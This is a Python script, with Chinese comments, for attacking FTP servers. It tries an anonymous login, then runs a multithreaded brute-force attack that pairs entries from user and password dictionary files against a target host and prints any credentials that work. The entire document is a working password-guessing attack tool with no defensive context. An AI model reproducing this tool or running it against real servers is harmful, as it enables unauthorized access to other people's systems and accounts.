# -*-coding:utf-8 -*-
import optparse
import ftplib
import threading
import socket


def anony_login(host):

    try:
        ftp = ftplib.FTP(host)
        ftp.connect(host, 21, timeout=10)
        ftp.login('anonymous', 'test@qq.com')
        ftp.retrlines('LIST')
        ftp.quit()
        print("\n[*]" + str(host) + " FTP 匿名登录成功")
    except Exception:
        print("\n[-]" + str(host) + " FTP 匿名登录失败")


def ftp_login(host, username, password):
    """
    尝试用户密码登陆FTP
    :param host:主机
    :param username:用户名
    :param password:密码
    :return:None
    """
    try:
        print("[-] Trying: " + username + "-" + password + "\n")
        ftp = ftplib.FTP(host)
        ftp.connect(host, 21, timeout=10)
        ftp.login(username, password)
        ftp.retrlines("LIST")
        ftp.quit()
        print("Success! " + username + " - " + password)
    except ftplib.all_errors:
        pass


def brute_force(host, users_file, pwds_file):

    users_f = open(users_file, 'r')
    pwds_f = open(pwds_file, 'r')
    for user in users_f.readlines():
        pwds_f.seek(0)
        for password in pwds_f.readlines():
            username = user.strip('\n')
            password = password.strip('\n')
            t = threading.Thread(target=ftp_login, args=(host, username, password))
            t.start()


def main():

    parser = optparse.OptionParser('usage%prog -H <target host> -u <users dictionary> -p <password dictionary>')
    parser.add_option('-H', dest='target_host', type='string', help='specify the host')
    parser.add_option('-u', dest='user_dic', type='string', help='specify the dictionary for user')
    parser.add_option('-p', dest='pwd_dic', type='string', help='specify the dictionary for passwords')
    (options, args) = parser.parse_args()
    host = options.target_host
    user_dic = options.user_dic
    pwd_dic = options.pwd_dic
    try:
        socket.gethostbyname(host)
    except Exception:
        print('[*] Cannot Resolve %s Unknown host' % host)
        exit()
    anony_login(host)
    brute_force(host, user_dic, pwd_dic)


if __name__ == '__main__':
    main()